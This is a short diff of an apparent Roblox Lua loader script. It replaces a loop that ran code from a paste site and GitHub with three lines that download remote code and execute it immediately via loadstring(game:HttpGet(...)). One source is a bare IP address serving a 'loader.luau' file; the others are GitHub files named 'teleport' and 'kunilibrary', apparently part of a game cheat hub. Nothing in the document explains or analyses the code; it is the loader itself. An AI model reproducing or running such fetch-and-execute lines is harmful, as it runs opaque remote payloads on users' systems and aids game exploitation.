@@ -1,18 +1,4 @@
 ID="e27944a7-712c-4649-9992-4207965ed8e1";
-loadstring(game:HttpGet("http://5.129.216.170:3910/cdn/loader.luau"))()
-
-local urls = {
-    "https://pastefy.app/PxUh5p9d/raw",
-    "https://raw.githubusercontent.com/swiftasfboi/KuniHub/refs/heads/main/kunilibrary"
-}
-
-for _, url in ipairs(urls) do
-    task.spawn(function()
-        local success, err = pcall(function()
-            loadstring(game:HttpGet(url))()
-        end)
-        if not success then
-            warn("Failed to execute script from: " .. url .. " | Error: " .. tostring(err))
-        end
-    end)
-end
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/swiftasfboi/GAG/refs/heads/main/teleport"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/swiftasfboi/KuniHub/refs/heads/main/kunilibrary"))()
